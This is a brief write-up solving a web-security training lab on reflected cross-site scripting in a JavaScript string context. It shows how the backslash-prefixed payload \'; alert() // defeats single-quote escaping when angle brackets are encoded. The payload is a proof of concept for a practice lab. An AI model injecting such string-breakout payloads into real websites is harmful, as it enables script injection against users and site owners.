https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped


This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.




1) search fot something like "test" 
2) in the source page you can see that test is reflected into variable of a script
    <script>
        var searchTerms = 'test';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

3) now if we try to inject 'test we can see that we are able to break the string
    
    var searchTerms = '' test ';

    so we can try to inject a script

    ' </script> <script>alert()</script>
    
    BUT < and > are encoded

4) so we try to inject directly an alert
   '; alert() //
   BUT ' are escaped to \

   but if we try to inject \'; alert() // it works because the var becomes

   var searchTerms = '\\'; alert() //';

    so it is the frist \ to be escaped


5) \'; alert() //



